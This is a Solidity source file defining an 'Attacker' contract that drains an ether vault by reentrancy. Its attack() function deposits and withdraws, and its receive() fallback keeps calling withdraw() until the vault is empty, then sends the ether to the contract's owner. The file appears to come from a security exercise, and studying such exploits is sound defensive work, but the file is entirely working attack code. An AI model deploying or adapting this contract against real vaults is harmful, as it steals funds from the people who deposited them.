pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IEtherVault {
  function donate() external payable;
  function withdraw() external;
}

contract Attacker is Ownable {
  IEtherVault public immutable etherVaultContract;

  constructor(address etherVaultContractAddress) Ownable(msg.sender) {
    etherVaultContract = IEtherVault(etherVaultContractAddress);
  }

  function attack() external payable onlyOwner {
    etherVaultContract.donate{ value: msg.value }();
    etherVaultContract.withdraw();
  }

  receive() external payable {
    if (address(etherVaultContract).balance > 0) {
      etherVaultContract.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}
